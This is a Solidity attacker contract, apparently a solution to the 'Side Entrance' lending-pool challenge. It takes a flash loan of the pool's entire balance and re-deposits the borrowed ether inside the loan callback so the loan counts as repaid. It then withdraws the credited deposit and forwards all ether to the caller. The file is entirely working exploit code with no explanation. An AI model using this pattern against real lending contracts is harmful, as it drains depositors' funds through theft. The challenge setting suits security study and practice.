// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

interface Lender {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttcker {
    using Address for address payable;

    address payable target;
    Lender lenderPool;

    constructor(address payable _target) {
        target = _target;
        lenderPool = Lender(target);
    }

    function attack() public {
        uint256 bal = target.balance;
        lenderPool.flashLoan(bal);
    }

    function execute() external payable {
        // uint256 contractbal = target.balance;
        // console.log("FROM CONTRACT::: Pool balance: ", contractbal);
        lenderPool.deposit{value: msg.value}();
    }

    function vacate() public payable {
        lenderPool.withdraw();
        // console.log("FROM CONTRACT::: Attacker bal: ", address(this).balance);
        payable(msg.sender).sendValue(address(this).balance);
    }

    receive() external payable {}
}
